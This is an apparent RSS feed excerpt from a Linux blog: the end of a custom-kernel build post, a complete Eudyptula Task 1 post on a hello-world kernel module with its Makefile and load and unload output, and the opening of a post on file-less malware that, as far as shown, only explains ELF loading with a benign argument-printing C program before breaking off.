<p>Anyways, we need these files in our <code>/boot/</code> directory so that our boot-loader can load our compiled kernel. But our boot-loader is dumb, it can not simply detect the files from <code>/boot/</code> and show us options on the boot-loader screen, we will have to do that as well. You might also need to generate a <code>initrd</code> file depending upon what configurations you are using on your system. If you are following the steps from this blog, then you need <strong>initrd</strong> for sure. <strong>Initrd</strong> is the program that helps your kernel to load and boot up properly by providing the modules support that are not built into the kernel at compile time. In this blog, we have not compiled all the modules in the kernel that our kernel might need at boot time, so we will create a <code>initrd</code> file and then we can tell our boot loader about our custom kernel.</p>
<p>Use <code>mkinitcpio</code> command to generate a initrd file and then update bootloader config using <code>grub-mkconfig</code> command. If you want this kernel to be default, then you&rsquo;ll have to make proper changes to the boot config file. Read more about it from <a href="https://wiki.archlinux.org/title/GRUB/Tips_and_tricks#Changing_the_default_menu_entry">arch wiki</a> or <a href="https://stackoverflow.com/questions/44422745/change-default-kernel-version-in-grub">stackoverflow</a>. If you are someone who prefers easy workarounds, you can also select the new kernel from the grub menu at boot time; Just make sure that <code>GRUB_TIMEOUT</code> variable (from <code>/etc/default/grub</code>) is not set to zero.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># generate initramfs
</span></span><span class="line"><span class="cl">sudo mkinitcpio -k 5.18.0ayedaemon-g8ab2afa23bd1 -g /boot/initramfs-ayedaemonlinux.img
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># update grub config - add entry to boot menu
</span></span><span class="line"><span class="cl">sudo grub-mkconfig -o /boot/grub/grub.cfg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Setup grub boot order if you want to - else use the lazy way
</span></span></code></pre></div><p>Output:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">#  sudo grub-mkconfig -o /boot/grub/grub.cfg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Generating grub configuration file ...
</span></span><span class="line"><span class="cl">Found linux image: /boot/vmlinuz-linux
</span></span><span class="line"><span class="cl">Found initrd image: /boot/initramfs-linux.img
</span></span><span class="line"><span class="cl">Found fallback initrd image(s) in /boot:  initramfs-linux-fallback.img
</span></span><span class="line"><span class="cl">Found linux image: /boot/vmlinuz-ayedaemonlinux
</span></span><span class="line"><span class="cl">Found initrd image: /boot/initramfs-ayedaemonlinux.img
</span></span><span class="line"><span class="cl">Warning: os-prober will not be executed to detect other bootable partitions.
</span></span><span class="line"><span class="cl">Systems on them will not be added to the GRUB boot configuration.
</span></span><span class="line"><span class="cl">Check GRUB_DISABLE_OS_PROBER documentation entry.
</span></span><span class="line"><span class="cl">done
</span></span></code></pre></div><p>From the output of last command, we can see that my <code>ayedaemonlinux</code> was detected by grub and it also updated the <code>/boot/grub/grub.cfg</code> file with current detections. Now, lets reboot and hope everything works as expected. Select the custom kernel from grub menu if needed and boot into it. If successfull, you can check the kernel version and other information with <code>uname</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># Before Reboot --&gt; uname -a
</span></span><span class="line"><span class="cl">Linux archlinux 5.18.1-arch1-1 #1 SMP PREEMPT_DYNAMIC Mon, 30 May 2022 17:53:11 +0000 x86_64 GNU/Linux
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># After Reboot --&gt; uname -a
</span></span><span class="line"><span class="cl">Linux archlinux 5.18.0ayedaemon-g8ab2afa23bd1 #1 SMP PREEMPT_DYNAMIC Wed Jun 1 16:54:51 UTC 2022 x86_64 GNU/Linux
</span></span></code></pre></div><p>We just compiled our very own first kernel and since we have not changed much of the kernel parameters and no user-space programs are affected with this. But we get our name on the kernel tag!!</p>
<p><img loading="lazy" src="https://media.giphy.com/media/jurcfxao8M3yzHmCjS/giphy.gif#center" alt=""  />
</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Arch is a rolling distro and the packages can be easily upgraded to latest versions available. No <code>&lt;package-name&gt; too old</code> kind of errors.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Eudyptula Task1</title>
      <link>https://ayedaemon.github.io/post/2022/05/eudyptula-task-1/</link>
      <pubDate>Wed, 25 May 2022 15:14:27 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/05/eudyptula-task-1/</guid>
      <description>Task 1 for Eudyptula challenge</description>
      <content:encoded><![CDATA[<h3 id="what-is-this">What is this?</h3>
<blockquote>
<p>The <a href="http://eudyptula-challenge.org/">Eudyptula Challenge</a> is a series of programming exercises for the Linux kernel, that start from a very basic “Hello world” kernel module, moving on up in complexity to getting patches accepted into the main Linux kernel source tree.</p>
</blockquote>
<p>Unfortunately, this project is not accepting any new applicants right now. So I decided to gather tasks details from other online sources and complete them locally.</p>
<h3 id="task-1">Task-1</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">This is Task 01 of the Eudyptula Challenge
</span></span><span class="line"><span class="cl">------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Write a Linux kernel module, and stand-alone Makefile, that when loaded
</span></span><span class="line"><span class="cl">prints to the kernel debug log level, &#34;Hello World!&#34;  Be sure to make
</span></span><span class="line"><span class="cl">the module be able to be unloaded as well.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The Makefile should build the kernel module against the source for the
</span></span><span class="line"><span class="cl">currently running kernel, or, use an environment variable to specify
</span></span><span class="line"><span class="cl">what kernel tree to build it against.
</span></span></code></pre></div><p>Linux provides a powerful and expansive API for applications, but sometimes that’s not enough. Interacting with a piece of hardware or conducting operations that require access to privileged information in the system can require a kernel module. In this task we have to write a kernel module that basically prints &ldquo;Hello World!&rdquo;.</p>
<h3 id="what-is-a-kernel-module">What is a Kernel Module?</h3>
<p>A Linux kernel module is a piece of compiled binary code that is inserted directly into the Linux kernel, running at ring 0, the lowest and least protected ring of execution in the x86–64 processor. Code here runs completely unchecked but operates at incredible speed and has access to everything in the system.</p>
<p>A loadable kernel module (LKM) is a mechanism for adding code to, or removing code from, the Linux kernel at run time. They are ideal for device drivers, enabling the kernel to communicate with the hardware without it having to know how the hardware works. The alternative to LKMs would be to build the code for each and every driver into the Linux kernel.</p>
<p>Without this modular capability, the Linux kernel would be very large, as it would have to support every driver that would ever be needed for the system to work properly. You would also have to rebuild the kernel every time you wanted to add new hardware or update a device driver.</p>
<p>Kernel modules run in kernel space and applications run in user space, and both kernel space and user space have their own unique memory address spaces that do not overlap. This approach ensures that applications running in user space have a consistent view of the hardware, regardless of the hardware platform. The kernel services are then made available to the user space in a controlled way through the use of system calls. The kernel also prevents individual user-space applications from conflicting with each other or from accessing restricted resources through the use of protection levels (e.g., superuser versus regular user permissions).</p>
<h3 id="prepare-system-for-building-lkms">Prepare system for building LKMs</h3>
<p>The system must be prepared to build kernel code, and to do this you must have the Linux headers installed on your device. On a typical Linux desktop machine you can use your package manager to locate the correct package to install. For example, under 64-bit Centos7 you can use the below code. Sometimes the package manager provides multiple version of headers, then you must install the headers for the exact version of your kernel build.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Update system</span>
</span></span><span class="line"><span class="cl">sudo yum update -y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Install headers</span>
</span></span><span class="line"><span class="cl">sudo yum install -y kernel-devel kernel-headers
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check headers</span>
</span></span><span class="line"><span class="cl">ls /usr/src/kernels/<span class="k">$(</span>uname -r<span class="k">)</span>
</span></span></code></pre></div><h3 id="write-first-module---hello-world">Write first module - Hello World</h3>
<p>The LKM code is very different from the regular user-space C program. Typical computer programs are reasonably straightforward. A loader allocates the memory for the program, then loads the program and other shared libraries into memory. Instruction Execution begins at some entrypoint (typically <code>main()</code> in C/C++ programs). On exit, OS identifies any memory leaks and frees lost memory to pool.</p>
<p>The LKMs are not applications - For a start there is no <code>main()</code>  and no <code>printf()</code> functions!!. They also do not have any automatic cleanup. Interestingly, they also do not have any floating-point support. In LKMs, the kernel module have atleast 2 entrypoint like functions; These functions executes at loading or unloading of the LKM.</p>
<p>The above can be a lot to digest all at once but it is important that they are addressed. Now, we can wrap our minds around the below code and understand how it works.</p>
<p>To start with, we need a <code>HelloWorld.c</code> file with  2 function definitions - <code>hello_world_init()</code> and <code>hello_world_exit()</code>. We then register first function to be executed when the LKM is loaded in the memory and the later is registered to be executed at unloading of the LKM. There are few extra functions that configure the metadata for the created module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;ayedaemon&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Eudyptula task1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">hello_world_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printk</span><span class="p">(</span><span class="n">KERN_DEBUG</span> <span class="s">&#34;Hello World!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">hello_world_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printk</span><span class="p">(</span><span class="n">KERN_DEBUG</span> <span class="s">&#34;Bye Bye World!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">hello_world_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">hello_world_exit</span><span class="p">);</span>
</span></span></code></pre></div><p>In kernel space, we do not have access to <code>printf()</code> functions, instead we have a very similar in usage function called <code>printk()</code><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, and you can call it from anywhere withing the LKM code. Read more about <code>printk()</code> from <a href="https://www.kernel.org/doc/html/latest/core-api/printk-basics.html">here</a>.<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
<p>Now that we’ve constructed the simplest possible module, let’s understand the important parts in detail:</p>
<ul>
<li>
<p>The “includes” cover the required header files necessary for Linux kernel development.</p>
</li>
<li>
<p><code>MODULE_LICENSE</code> can be set to a variety of values depending on the license<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> of the module. Other following 2 lines are also a part of module metadata.</p>
</li>
<li>
<p>At the end of the file, we call module_init and module_exit to tell the kernel which functions are or loading and unloading functions. This gives us the freedom to name the functions whatever we like.</p>
</li>
</ul>
<h3 id="-make-makefile">&hellip; make Makefile</h3>
<p>A Makefile is required to build the kernel module — in fact, it is a special <strong>kbuild</strong> Makefile. Below is the <code>Makefile</code> used to build the above LKM code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="nv">obj-m</span> <span class="o">+=</span> HelloWorld.o
</span></span><span class="line"><span class="cl"><span class="nv">KDIR</span> <span class="o">:=</span> /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">all</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	<span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	<span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> clean
</span></span></code></pre></div><p>First line of this Makefile is called <em>goal definition</em> and it defines the module to be built.  The rest of the Makefile is a regular makefile. Here, <code>-C</code> option switches the directory to the kernel directory before performing any make tasks. The <code>M=$(PWD)</code> variable assignment tells the make command where the actual project files exist, which helps make to return back to the project directory from kernel directory.</p>
<p>All going well, the process to build the kernel module should be straightforward, provided that you have installed the Linux headers as described earlier. The steps are as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[vagrant@centos7 task-1]$ ls
</span></span><span class="line"><span class="cl">HelloWorld.c  Makefile  README.md
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[vagrant@centos7 task-1]$ make
</span></span><span class="line"><span class="cl">make -C /lib/modules/3.10.0-1160.62.1.el7.x86_64/build M=/vagrant_data/task-1 modules
</span></span><span class="line"><span class="cl">make[1]: Entering directory `/usr/src/kernels/3.10.0-1160.62.1.el7.x86_64&#39;
</span></span><span class="line"><span class="cl">  CC [M]  /vagrant_data/task-1/HelloWorld.o
</span></span><span class="line"><span class="cl">  Building modules, stage 2.
</span></span><span class="line"><span class="cl">  MODPOST 1 modules
</span></span><span class="line"><span class="cl">  CC      /vagrant_data/task-1/HelloWorld.mod.o
</span></span><span class="line"><span class="cl">  LD [M]  /vagrant_data/task-1/HelloWorld.ko
</span></span><span class="line"><span class="cl">make[1]: Leaving directory `/usr/src/kernels/3.10.0-1160.62.1.el7.x86_64&#39;
</span></span></code></pre></div><p>Once the module is successfully buit, we can test it by loading the module using <code>insmod</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[vagrant@centos7 task-1]$ ls -l *.ko
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 vagrant vagrant 101880 May 25 18:03 HelloWorld.ko
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[vagrant@centos7 task-1]$ sudo insmod HelloWorld.ko
</span></span><span class="line"><span class="cl">[vagrant@centos7 task-1]$ dmesg | tail -1
</span></span><span class="line"><span class="cl">[35803.038855] Hello World!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[vagrant@centos7 task-1]$ lsmod | head -2
</span></span><span class="line"><span class="cl">Module                  Size  Used by
</span></span><span class="line"><span class="cl">HelloWorld             12496  0
</span></span></code></pre></div><p>The metadata information coded in the LKM can be checked with <code>modinfo</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[vagrant@centos7 task-1]$ modinfo HelloWorld.ko
</span></span><span class="line"><span class="cl">filename:       /vagrant_data/task-1/HelloWorld.ko
</span></span><span class="line"><span class="cl">description:    Eudyptula task1
</span></span><span class="line"><span class="cl">author:         ayedaemon
</span></span><span class="line"><span class="cl">license:        GPL
</span></span><span class="line"><span class="cl">retpoline:      Y
</span></span><span class="line"><span class="cl">rhelversion:    7.9
</span></span><span class="line"><span class="cl">srcversion:     7969E1C9B651C03B53BA6B2
</span></span><span class="line"><span class="cl">depends:
</span></span><span class="line"><span class="cl">vermagic:       3.10.0-1160.62.1.el7.x86_64 SMP mod_unload modversions
</span></span></code></pre></div><p>At last, the module can be unloaded easily with <code>rmmod</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[vagrant@centos7 task-1]$ sudo rmmod HelloWorld.ko
</span></span><span class="line"><span class="cl">[vagrant@centos7 task-1]$ dmesg | tail -2
</span></span><span class="line"><span class="cl">[35803.038855] Hello World!
</span></span><span class="line"><span class="cl">[35983.753824] Bye Bye World!
</span></span></code></pre></div><h3 id="conclusion">Conclusion</h3>
<p>Hopefully you have built your first loadable kernel module (LKM). Despite the simplicity of the functionality of this module there was a lot of material to cover — by the end of this article: you should have a broad idea of how loadable kernel modules work; you should have your system configured to build, load and unload such modules; and, you should be able to define custom parameters for your LKMs.</p>
<p>Just remember that you are completely on your own in kernel land. There are no backstops or second chances for your code. If you’re quoting a project for a client, be sure to double, if not triple, the anticipated debugging time. Kernel code has to be as perfect as possible to ensure the integrity and reliability of the systems that will run it.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>If there is no <code>\n</code> character at the end of the <code>printk()</code> string, then the next <code>printk()</code>  string will also be printed in dmesg. I was able to see both <code>Hello World!</code> and <code>Bye Bye World</code> at the same time when I was either loading or unloading the module.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://www.kernel.org/doc/html/latest/core-api/printk-basics.html">https://www.kernel.org/doc/html/latest/core-api/printk-basics.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Linux kernel licensing rules - <a href="https://www.kernel.org/doc/html/latest/process/license-rules.html">https://www.kernel.org/doc/html/latest/process/license-rules.html</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>File-less malwares: what and how</title>
      <link>https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/</link>
      <pubDate>Sat, 26 Feb 2022 23:43:01 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/</guid>
      <description>What are file-less malwares? How do they work on linux?
According to Wikipedia, file-less malware is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.
In other words, the malware/program is never written to harddisk but directly loaded in memory.
To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself.</description>
      <content:encoded><![CDATA[<blockquote>
<p>What are file-less malwares? How do they work on linux?</p>
</blockquote>
<p>According to Wikipedia, <strong>file-less malware</strong> is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.</p>
<p>In other words, the malware/program is never written to harddisk but directly loaded in memory.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/521JLj0YGzz6AEWsZ5/giphy.gif" alt="How???"  />
</p>
<p>To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself. If you already know this, feel free to skip next section.</p>
<h3 id="how-normal-program-loads-and-executes-itself">How normal program loads and executes itself?</h3>
<p>This is a &ldquo;HUGE&rdquo; topic for a mere blog post. So we&rsquo;ll just scratch the surface and understand about ELF files. ELF Files are main binary format in use on modern Linux systems, and support for it is implemented in the file <a href="https://elixir.bootlin.com/linux/v5.16.10/source/fs/binfmt_elf.c">fs/binfmt_elf.c</a>.</p>
<p>Let&rsquo;s build our own C program to generate an ELF binary so we can follow and know what we are doing.</p>
<p>Create a C program file with <code>vim not_hello_world.c</code>, and paste the below code into it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Prints total argument count passed to executable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Argument count : %2d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Prints the arguments list along with memory location
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Arguments list :</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">argc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">argv[%1$d] =[ %2$p ]==&gt; %2$s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Prints all the environment variables passed to executable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Environment list :</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">envp</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">envp[%1$d] =[ %2$p ]==&gt; %2$s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">envp</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The above code will print out the argc, argv and envp values to the standard output.</p>
<p><strong>Compile it</strong> : <code>gcc not_hello_world.c -o not_hello_world.o</code></p>
<p><strong>Check file type</strong> : <code>file not_hello_world.o</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">not_hello_world.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82cad832f6d9b9a2d071be6bca3ccab87c8c71f6, for GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div><p><strong>Run it</strong> : <code>./not_hello_world.o 12345 123 12345678901234567890 1234</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Argument</span> <span class="n">count</span> <span class="p">:</span>  <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="n">Arguments</span> <span class="n">list</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9370c</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="o">./</span><span class="n">not_hello_world</span><span class="o">.</span><span class="n">o</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93720</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">12345</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93726</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">123</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9372a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">12345678901234567890</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9373f</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">1234</span>
</span></span><span class="line"><span class="cl"><span class="ne">Environment</span> <span class="n">list</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93744</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93754</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LANGUAGE</span><span class="o">=</span><span class="n">en_US</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93764</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">PWD</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">blog_junk</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9378a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LOGNAME</span><span class="o">=</span><span class="n">vagrant</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9379a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_TYPE</span><span class="o">=</span><span class="n">tty</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937af</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">MOTD_SHOWN</span><span class="o">=</span><span class="n">pam</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937be</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">HOME</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937d1</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LANG</span><span class="o">=</span><span class="n">en_US</span><span class="o">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
